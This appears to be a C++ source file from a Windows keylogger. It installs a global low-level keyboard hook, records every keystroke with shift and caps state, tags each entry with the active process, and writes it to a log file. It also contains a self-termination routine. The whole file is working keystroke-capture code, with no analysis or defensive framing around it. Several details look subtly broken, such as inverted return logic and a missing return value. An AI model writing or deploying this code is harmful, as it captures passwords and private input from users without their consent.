#include "keyhook.h"

HHOOK hook = nullptr;
std::string keyLog;

bool caps = false;
bool shift = false;

Stream::LogFile *logFile;

LRESULT KeyHook::RunHook(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode < 0) {
		CallNextHookEx(hook, nCode, wParam, lParam);
	}
	auto *pKbDllHookStruct = (KBDLLHOOKSTRUCT *)lParam;

	if (wParam==WM_KEYDOWN || wParam==WM_SYSKEYDOWN) {
		DWORD key = pKbDllHookStruct->vkCode;
		if (key==VK_CAPITAL) {
			caps = !caps;
			if (!caps) {
				std::string keyName = KeyConst::AddKey(key, caps, shift);
				if (keyName.length() > 0) {
					keyName.insert(1, "/");
				}
				keyLog += keyName;
			} else {
				keyLog += KeyConst::AddKey(key, caps, shift);
			}
		} else if (key==VK_SHIFT || key==VK_RSHIFT || key==VK_LSHIFT) {
			if (!shift) {
				shift = true;
				keyLog += KeyConst::AddKey(key, caps, shift);
			}
		} else {
			keyLog += KeyConst::AddKey(key, caps, shift);
		}
		Stream::WriteLog(keyLog, clientInfo.activeProcess, *logFile);
		keyLog.clear();
	}

	if (pKbDllHookStruct->vkCode==VK_RETURN) {
		keyLog += '\n';
	} else if (wParam==WM_KEYUP || wParam==WM_SYSKEYUP) {
		DWORD key = pKbDllHookStruct->vkCode;
		if (key==VK_SHIFT || key==VK_RSHIFT || key==VK_LSHIFT) {
			shift = false;
		}

		if (key==VK_CONTROL
				|| key==VK_LCONTROL
				|| key==VK_RCONTROL
				|| key==VK_MENU
				|| key==VK_LMENU
				|| key==VK_RMENU
				|| key==VK_NUMLOCK
				|| key==VK_LWIN
				|| key==VK_RWIN
				|| key==VK_SHIFT
				|| key==VK_RSHIFT
				|| key==VK_LSHIFT) {
			std::string keyName = KeyConst::AddKey(pKbDllHookStruct->vkCode, caps, shift);
			if (keyName.length() > 0) {
				keyName.insert(1, "/");
			}
			keyLog += keyName;
			Stream::WriteLog(keyLog, clientInfo.activeProcess, *logFile);
			keyLog.clear();
		}
	}
	return CallNextHookEx(hook, nCode, wParam, lParam);
}

bool KeyHook::InstallHook() {
	hook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)RunHook, GetModuleHandle(nullptr), NULL);
	return hook==nullptr;
}

bool KeyHook::UninstallHook() {
	bool b = UnhookWindowsHookEx(hook);
	hook = nullptr;
	return b;
}

bool KeyHook::KillProcess() {
	HANDLE handle;

	HandleMessage(false);
	handle = OpenProcess(KEY_ALL_ACCESS, TRUE, GetCurrentProcessId());
	return TerminateProcess(handle, 0);
}

DWORD WINAPI KeyHook::HandleMessage(LPVOID lpParam) {
	MSG msg;
	while (GetMessage(&msg, nullptr, 0, 0) && (bool)lpParam) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
}
void KeyHook::SetLogFile(Stream::LogFile *file) {
	logFile = file;
}
